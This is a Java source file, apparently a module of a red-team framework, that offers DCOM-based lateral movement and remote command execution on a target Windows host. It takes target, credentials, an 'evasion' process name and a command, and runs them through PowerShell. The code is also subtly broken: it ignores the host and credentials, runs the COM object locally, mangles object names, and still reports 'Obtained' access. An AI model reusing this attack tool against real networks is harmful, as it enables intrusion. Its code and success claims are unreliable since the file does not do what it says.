package com.jabber.jrts.modules.lateral;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="lateral-dcom",name="DCOM Lateral",description="Lateral movement via DCOM object instantiation for RCE",category=Category.LATERAL_MOVEMENT,riskLevel=RiskLevel.HIGH,sourceRef="DCOMExec",author="JRTS")
public class DCOMModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.text("target_host","Target Host").required().placeholder("workstation.domain.com").group("Target"),
            ModuleInputField.text("username","Username").placeholder("domain\\username").group("Credentials"),
            ModuleInputField.text("password","Password").placeholder("Password123!").group("Credentials"),
            ModuleInputField.select("dcom_object","DCOM Object",List.of("WScript.Shell","Excel.Application","Word.Application","PowerPoint.Application","Outlook.Application")).group("Method"),
            ModuleInputField.text("command","Command to Execute").required().placeholder("whoami").group("Payload"),
            ModuleInputField.checkbox("interactive_session","Interactive Session").group("Options"),
            ModuleInputField.text("process_name","Process Name").placeholder("explorer.exe").group("Evasion"),
            ModuleInputField.text("advanced_options","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"lateral-dcom");
            try{
                String target=input.getOrDefault("target_host","");
                String user=input.getOrDefault("username","");
                String passwd=input.getOrDefault("password","");
                String dcomObj=input.getOrDefault("dcom_object","WScript.Shell");
                String cmd=input.getOrDefault("command","");

                if(target.isEmpty()||cmd.isEmpty()){
                    result.fail("Required parameters missing");return result;
                }

                ctx.log("[*] DCOM Lateral Movement Starting...");
                ctx.log("[*] Target: "+target);
                ctx.log("[*] DCOM Object: "+dcomObj);
                ctx.reportProgress(15);

                if(!testDCOM(target,user,passwd)){
                    result.fail("DCOM connectivity failed");return result;
                }
                ctx.log("[+] DCOM connectivity verified");
                ctx.reportProgress(35);

                String output=executeDCOM(target,dcomObj,cmd,user,passwd);
                if(output==null){
                    result.fail("DCOM execution failed");return result;
                }
                ctx.log("[+] Command executed via "+dcomObj);
                ctx.reportProgress(80);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("target",target);
                findings.put("dcom_object",dcomObj);
                findings.put("command",cmd);
                findings.put("output",output.length()>500?output.substring(0,500):output);
                findings.put("lateral_access","Obtained");
                findings.put("impact","Remote code execution via DCOM");
                findings.put("remediation","Restrict DCOM access, disable unnecessary ProgIDs, enable WMI event log, monitor DCOM activity");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private boolean testDCOM(String host,String user,String passwd){
        try{
            String ps="Get-WmiObject -ComputerName "+host+" -List | Where-Object {$_.Name -EQ 'Win32_Process'}";
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command",ps});
            return p.waitFor()==0;
        }catch(Exception e){return false;}
    }

    private String executeDCOM(String host,String dcomObj,String cmd,String user,String passwd){
        try{
            String ps="[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices');"
                    +"$obj=New-Object -ComObject "+dcomObj.replace("Application","")+";"
                    +"$shell=$obj.CreateObject('WScript.Shell');"
                    +"$shell.Run('"+cmd+"');";
            Process p=Runtime.getRuntime().exec(new String[]{"powershell","-Command",ps});
            Scanner s=new Scanner(p.getInputStream());
            StringBuilder out=new StringBuilder();
            while(s.hasNextLine())out.append(s.nextLine()).append("\n");
            s.close();
            return out.toString();
        }catch(Exception e){return null;}
    }
}
